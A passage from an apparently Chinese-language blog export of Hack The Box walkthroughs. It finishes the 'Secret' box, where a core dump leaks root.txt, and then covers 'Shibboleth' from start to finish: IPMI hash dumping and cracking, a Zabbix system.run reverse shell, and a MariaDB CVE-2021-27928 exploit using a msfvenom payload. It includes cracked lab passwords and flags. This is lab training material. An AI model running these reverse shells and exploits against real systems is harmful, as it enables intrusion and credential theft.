printf((fstat.st_mode &amp; S_IROTH) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IWOTH) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IXOTH) ? &quot;x&quot; : &quot;-&quot;); } else { printf(&quot;??????????&quot;); } printf (&quot;\\t%s\\n&quot;, ent-&gt;d_name); } closedir(dir); snprintf(summary, 4096, &quot;Total entries = %d\\nRegular files = %d\\nDirectories = %d\\nSymbolic links = %d\\n&quot;, tot, regular_files, directories, symlinks); printf(&quot;\\n%s&quot;, summary); } void filecount(const char *path, char *summary) { FILE *file; char ch; int characters, words, lines; file = fopen(path, &quot;r&quot;); if (file == NULL) { printf(&quot;\\nUnable to open file.\\n&quot;); printf(&quot;Please check if file exists and you have read privilege.\\n&quot;); exit(EXIT_FAILURE); } characters = words = lines = 0; while ((ch = fgetc(file)) != EOF) { characters++; if (ch == &#39;\\n&#39; || ch == &#39;\\0&#39;) lines++; if (ch == &#39; &#39; || ch == &#39;\\t&#39; || ch == &#39;\\n&#39; || ch == &#39;\\0&#39;) words++; } if (characters &gt; 0) { words++; lines++; } snprintf(summary, 256, &quot;Total characters = %d\\nTotal words = %d\\nTotal lines = %d\\n&quot;, characters, words, lines); printf(&quot;\\n%s&quot;, summary); } int main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(&quot;Enter source file/directory name: &quot;); scanf(&quot;%99s&quot;, path); getchar(); stat(path, &amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(&quot;Save results a file? [y/N]: &quot;); res = getchar(); if (res == 121 || res == 89) { printf(&quot;Path: &quot;); scanf(&quot;%99s&quot;, path); FILE *fp = fopen(path, &quot;a&quot;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(&quot;Could not open %s for writing\\n&quot;, path); } } return 0; } 这是count的源码，通过分析后得知 这里大多数情况下，如果我们在执行代码中崩溃了，报告通常会保存在/var/crash中 在通常情况下，这是不可能的，但是通过这个pem设置prctl(PR_SET_DUMPABLE, 1);，它可以被实现 由于它设置为1，我们可以产生核心转储，利用的话需要两个条件 首先需要确保有两个shell 可以导致崩溃 现在让我们去用上面漏洞利用的方式再获取一个shell Shell 1dasith@secret:/$ cd /opt cd /opt dasith@secret:/opt$ ./count -p ./count -p Enter source file/directory name: /root/root.txt /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y y 执行后去shell 2让进程崩溃 Shell 2dasith@secret:~/local-web$ cd /opt cd /opt dasith@secret:/opt$ ps -aux | grep count ps -aux | grep count root 862 0.0 0.1 235672 7480 ? Ssl 06:15 0:00 /usr/lib/accountsservice/accounts-daemon root 1342 0.0 0.0 2488 516 ? S 06:50 0:00 ./count root 1435 0.0 0.0 2488 588 ? S 06:54 0:00 ./count dasith 1460 0.0 1.0 52448 41712 ? S 07:00 0:00 gdb ./count dasith 1462 0.0 0.0 2488 600 ? S 07:00 0:00 /opt/count root 1850 0.0 0.0 2488 592 pts/0 S+ 07:41 0:00 ./count -p dasith 1885 0.0 0.0 2488 524 pts/4 S+ 07:43 0:00 ./count -p dasith 1887 0.0 0.0 6432 740 pts/2 S+ 07:44 0:00 grep --color=auto count dasith@secret:/opt$ kill -BUS 1885 kill -BUS 1885 然后再去shell1检查进程是否崩溃 Shell 1 第二次Path: Bus error (core dumped) 已经看到这句提示了，但作为保险我们还是再验证一次 dasith@secret:/opt$ cd /var/crash cd /var/crash dasith@secret:/var/crash$ ls -la ls -la total 36 drwxrwxrwt 2 root root 4096 Dec 6 07:44 . drwxr-xr-x 14 root root 4096 Aug 13 05:12 .. -rw-r----- 1 dasith dasith 28207 Dec 6 07:44 _opt_count.1000.crash 这里可以看到已经生成了错误日志了，新建一个我们自己的目录，然后把文件拷贝过去 dasith@secret:/var/crash$ mkdir /tmp/lucifiel mkdir /tmp/lucifiel dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/lucifiel apport-unpack _opt_count.1000.crash /tmp/lucifiel dasith@secret:/var/crash$ cd /tmp/lucifiel cd /tmp/lucifiel dasith@secret:/tmp/lucifiel$ ls -la ls -la total 436 drwxr-xr-x 2 dasith dasith 4096 Dec 6 07:51 . drwxrwxrwt 13 root root 4096 Dec 6 07:49 .. -rw-r--r-- 1 dasith dasith 5 Dec 6 07:51 Architecture -rw-r--r-- 1 dasith dasith 380928 Dec 6 07:51 CoreDump -rw-r--r-- 1 dasith dasith 24 Dec 6 07:51 Date -rw-r--r-- 1 dasith dasith 12 Dec 6 07:51 DistroRelease -rw-r--r-- 1 dasith dasith 10 Dec 6 07:51 ExecutablePath -rw-r--r-- 1 dasith dasith 10 Dec 6 07:51 ExecutableTimestamp -rw-r--r-- 1 dasith dasith 5 Dec 6 07:51 ProblemType -rw-r--r-- 1 dasith dasith 10 Dec 6 07:51 ProcCmdline -rw-r--r-- 1 dasith dasith 4 Dec 6 07:51 ProcCwd -rw-r--r-- 1 dasith dasith 53 Dec 6 07:51 ProcEnviron -rw-r--r-- 1 dasith dasith 2144 Dec 6 07:51 ProcMaps -rw-r--r-- 1 dasith dasith 1336 Dec 6 07:51 ProcStatus -rw-r--r-- 1 dasith dasith 1 Dec 6 07:51 Signal -rw-r--r-- 1 dasith dasith 29 Dec 6 07:51 Uname -rw-r--r-- 1 dasith dasith 3 Dec 6 07:51 UserGroups 我们可以看到有一个CoreDump文件，我们将其以字符串形式输出 dasith@secret:/tmp/lucifiel$ strings CoreDump strings CoreDump CORE CORE count ./count -p IGISCORE CORE ELIFCORE /opt/count /opt/count /opt/count /opt/count /opt/count /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so CORE //////////////// Path: Could LINUX //////////////// Path: Could TUUU /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid exit readdir fopen closedir __isoc99_scanf strncpy __stack_chk_fail putchar fgetc strlen prctl getchar fputs fclose opendir getuid strncat __cxa_finalize __libc_start_main snprintf __xstat __lxstat GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable Unable to open directory. ?????????? Total entries = %d Regular files = %d Directories = %d Symbolic links = %d Unable to open file. Please check if file exists and you have read privilege. Total characters = %d Total words = %d Total lines = %d Enter source file/directory name: %99s Save results a file? [y/N]: Path: Could not open %s for writing :*3$&quot; Path: esults a file? [y/N]: words = 2 Total lines = 2 oot/root.txt 1bf72c039cbd58751b38c6916602f537 aliases ethers group gshadow hosts initgroups netgroup networks passwd protocols publickey services shadow CAk[S libc.so.6 /lib/x86_64-linux-gnu libc.so.6 uTi7J |F:m _rtld_global __get_cpu_features _dl_find_dso_for_object _dl_make_stack_executable _dl_exception_create __libc_stack_end _dl_catch_exception malloc _dl_deallocate_tls _dl_signal_exception __tunable_get_val __libc_enable_secure __tls_get_addr _dl_get_tls_static_info calloc _dl_exception_free _dl_debug_state _dl_argv _dl_allocate_tls_init _rtld_global_ro realloc _dl_rtld_di_serinfo _dl_mcount _dl_allocate_tls _dl_signal_error _dl_exception_create_format _r_debug _dl_catch_error ld-linux-x86-64.so.2 GLIBC_2.2.5 GLIBC_2.3 GLIBC_2.4 GLIBC_PRIVATE sse2 x86_64 avx512_1 i586 i686 haswell xeon_phi linux-vdso.so.1 tls/haswell/avx512_1/x86_64/tls/haswell/x86_64/tls/avx512_1/x86_64/tls/x86_64/ /lib/x86_64-linux-gnu/libc.so.6 %%%%%%%%%%%%%%%% //////////////// ory name: %99s /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 cI,b x86_64 ./count SHELL=/bin/sh versioning=[object Object] unstable_restarts=0 treekill=true env=[object Object] filter_env= namespace=default restart_time=0 DB_CONNECT=mongodb://127.0.0.1:27017/auth-web axm_options=[object Object] vizion_running=false PWD=/opt LOGNAME=dasith PM2_USAGE=CLI exec_interpreter=node PM2_HOME=/home/dasith/.pm2 HOME=/home/dasith NODE_APP_INSTANCE=0 LANG=en_US.UTF-8 LS_COLORS= pm_id=0 version=1.0.0 pm_uptime=1638771355228 km_link=false pm_cwd=/home/dasith/local-web axm_monitor=[object Object] instance_var=NODE_APP_INSTANCE pmx=true unique_id=340d74ce-a3fa-4484-a533-bfcb827fe92c LESSCLOSE=/usr/bin/lesspipe %s %s vizion=true username=dasith LESSOPEN=| /usr/bin/lesspipe %s watch=false windowsHide=true automation=true axm_actions= SHLVL=1 TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE PM2_INTERACTOR_PROCESSING=true created_at=1633619800035 merge_logs=true pm_pid_path=/home/dasith/.pm2/pids/index-0.pid PATH=/usr/bin:/bin pm_err_log_path=/home/dasith/.pm2/logs/index-error.log node_version=10.19.0 kill_retry_time=100 autorestart=true axm_dynamic=[object Object] node_args= exec_mode=fork_mode pm_exec_path=/home/dasith/local-web/index.js OLDPWD=/ status=launching name=index pm_out_log_path=/home/dasith/.pm2/logs/index-out.log _=./count ./count bemX __vdso_gettimeofday __vdso_time __vdso_clock_gettime __vdso_clock_getres __vdso_getcpu linux-vdso.so.1 LINUX_2.6 Linux Linux AUATS A\\A]] [A\\M A]]I [A\\] [A\\] GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 .shstrtab .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_d .dynamic .note .eh_frame_hdr .eh_frame .text .altinstructions .altinstr_replacement .comment oot/root.txt 1bf72c039cbd58751b38c6916602f537 从中获取到了root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Shibboleth - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Shibboleth","date":"2021-12-03T11:38:36.000Z","updated":"2023-06-13T03:52:20.000Z","comments":true,"path":"2021/12/03/Hackthebox/Medium/Hackthebox-Shibboleth/","link":"","permalink":"http://www.lucifiel.com/2021/12/03/Hackthebox/Medium/Hackthebox-Shibboleth/","excerpt":"","text":"Hackthebox - Shibboleth靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.124 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 20:39 EST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 2.92 seconds 一台禁ping的主机，加上-Pn参数吧 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -Pn --min-rate 5000 10.10.11.124 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:32 EST Nmap scan report for bogon (10.10.11.124) Host is up (0.27s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=31778%PV=Y%DS=2%DC=T%G=Y%TM=61A981D OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ( OS:SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3= OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7 OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z OS:%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40 OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: shibboleth.htb TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 272.47 ms bogon (10.10.14.1) 2 273.08 ms bogon (10.10.11.124) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds 发现只有一个80端口，去访问一下 直接访问会被跳转到shibboleth.htb，咱们给他加一个hosts echo 10.10.11.124 shibboleth.htb &gt;&gt; /etc/hosts 再次访问就没问题了，老规矩，扫描一下URL，然后顺便看看网页 ┌──(root💀kali)-[~] └─# ffuf -u &quot;http://shibboleth.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ assets [Status: 301, Size: 317, Words: 20, Lines: 10] forms [Status: 301, Size: 316, Words: 20, Lines: 10] . [Status: 200, Size: 59474, Words: 17014, Lines: 1324] :: Progress: [43003/43003] :: Job [1/1] :: 123 req/sec :: Duration: [0:05:55] :: Errors: 0 :: 好像也没什么有用的东西，是不是思路错了？找一下vhost试试 ┌──(root💀kali)-[~] └─# ffuf -u &quot;http://shibboleth.htb/&quot; -H &quot;Host:FUZZ.shibboleth.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ monitor [Status: 200, Size: 3686, Words: 192, Lines: 30] monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30] zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30] :: Progress: [4989/4989] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:49] :: Errors: 0 :: 发现三个vshost，都加入到hosts内吧 echo 10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb &gt;&gt; /etc/hosts 三个vhost到的页面都是一样的 测试了一下默认口令和弱口令，均无法正常进入 扫描一下ZABBIX的UDP端口 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -Pn -sU --min-rate 5000 10.10.11.124 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:34 EST Nmap scan report for bogon (10.10.11.124) Host is up (0.25s latency). Not shown: 1002 closed ports, 996 open|filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ 623/udp open asf-rmcp 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port623-UDP:V=7.91%I=7%D=12/2%Time=61A98220%P=x86_64-pc-linux-gnu%r(ipm SF:i-rmcp,1E,&quot;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01 SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=19625%PV=Y%DS=2%DC=T%G=Y%TM=61A99CF OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A= OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40 OS:%CD=S) Network Distance: 2 hops Service Info: Host: shibboleth.htb TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 262.39 ms bogon (10.10.14.1) 2 247.76 ms bogon (10.10.11.124) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6882.83 seconds 漏洞利用去Google一下623端口的服务看看是否有可利用的漏洞 Google asf-rmcp exploit 还真找到一篇相关文章 https://book.hacktricks.xyz/pentesting/623-udp-ipmi 这里介绍了msf中ipmi的版本识别的脚本，去尝试一下 msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.10.11.124 rhosts =&gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; exploit [*] Sending IPMI requests to 10.10.11.124-&gt;10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 确定了版本，然后咱们去找一下是否有利用模块 这里有一个hashdump的脚本，似乎可以导出hash，咱们试试 msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt yes File containing common passwords for offline cracking, one per line RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 623 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt yes File containing usernames, one per line msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.10.11.124 rhosts =&gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; exploit [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 成功拿到一个账户的hash，咱们使用hashcat爆破hash ┌──(root💀kali)-[~/Desktop] └─# hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 1417/1481 MB (512 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 65 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6:ilovepumkinpie1 Session..........: hashcat Status...........: Cracked Hash.Name........: IPMI2 RAKP HMAC-SHA1 Hash.Target......: 9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52...27dcd6 Time.Started.....: Thu Dec 2 21:26:57 2021 (5 secs) Time.Estimated...: Thu Dec 2 21:27:02 2021 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1534.7 kH/s (1.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 7397376/14344385 (51.57%) Rejected.........: 0/7397376 (0.00%) Restore.Point....: 7393280/14344385 (51.54%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: iloverobert!!! -&gt; ilovemymum64. Started: Thu Dec 2 21:26:38 2021 Stopped: Thu Dec 2 21:27:03 2021 成功爆破出hash，确定了账号密码 Username = Administrator Password = ilovepumkinpie1 拿着账号密码去登录后台试试 成功登录后台 经过测试 在Configguration的Hosts里点击Items，然后进去添加新项目的的Key处，也可以Getshell 有两篇Zabbix的相关文章大家可以看一下 https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent https://sbcode.net/zabbix/agent-execute-python/ system.run[/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.19/4444 0&gt;&amp;1&quot;,nowait] 这边需要使用system.run来进行执行命令，上面就是我们的exploit 首先使用nc进行一个端口监听 nc -nvlp 4444 然后在网页中的Key处输入我们的Exploit，然后保存就可以了 然后点击最下面的保存，就可以执行我们的Exploit ┌──(root💀kali)-[~] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 54322 sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; zabbix@shibboleth:/$ whoami&amp;&amp;id whoami&amp;&amp;id zabbix uid=110(zabbix) gid=118(zabbix) groups=118(zabbix) 成功获得一个shell 权限提升User权限zabbix@shibboleth:/$ cat /etc/passwd | grep bash cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash 首先查看一下有bash权限的账户，有一个ipmi-svc，看来咱们必须得提权到它 我们需要登录到ipmi-svc账户，密码与网站后台密码是一样的 zabbix@shibboleth:/etc/zabbix$ su ipmi-svc su ipmi-svc Password: ilovepumkinpie1 ipmi-svc@shibboleth:/etc/zabbix$ whoami&amp;&amp;id whoami&amp;&amp;id ipmi-svc uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc) ipmi-svc@shibboleth:/tmp$ cd cd ipmi-svc@shibboleth:~$ ls ls user.txt ipmi-svc@shibboleth:~$ cat user.txt cat user.txt b6611bf946f56dc23bcfc3e77f150204 成功获得user权限的flag文件 root权限在zabbix服务器下找到数据库配置文件密码 ipmi-svc@shibboleth:/etc/zabbix$ grep -iR &#39;password&#39; /etc/zabbix/ 2&gt;/dev/null grep -iR &#39;password&#39; /etc/zabbix/ 2&gt;/dev/null /etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword /etc/zabbix/zabbix_server.conf.dpkg-dist:# Database password. /etc/zabbix/zabbix_server.conf.dpkg-dist:# Comment this line if no password is used. /etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword= /etc/zabbix/zabbix_server.conf:### Option: DBPassword /etc/zabbix/zabbix_server.conf:# Database password. /etc/zabbix/zabbix_server.conf:# Comment this line if no password is used. /etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh 然后登录mysql服务 ipmi-svc@shibboleth:/etc/zabbix$ mysql -u zabbix -p -D zabbix mysql -u zabbix -p -D zabbix Enter password: bloooarskybluh Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2954 Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. 将10.3.25-MariaDB该版本拿去Google一下 https://github.com/Al1ex/CVE-2021-27928 找到了一个CVE 该Exploit大概分为几步 Step 1： 使用Msf生成一个.so的木马 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 -f elf-so -o Exploit.so Step 2： 使用NC监听一个端口 Nc -nvlp 5555 Step 3： 将Exploit上传到靶机的/tmp目录下 本地机器：Python3开始一个Http服务 python3 -m http.server 80 靶机：下载Exploit并保存到/tmp目录下 cd /tmp wget http://10.10.14.19/Exploit.so Step 4： 登录mysql后执行脚本 SET GLOBAL wsrep_provider=&quot;/tmp/Exploit.so&quot;; ┌──(root💀kali)-[~] └─# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 38044 python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; root@shibboleth:/var/lib/mysql# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功获得root权限 root@shibboleth:/var/lib/mysql# cd /root cd /root root@shibboleth:/root# ls ls root.txt scripts root@shibboleth:/root# cat root.txt cat root.txt f99dbe4d5d33fc228cb8eaaf5cf0d2ac 成功获得root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Driver - 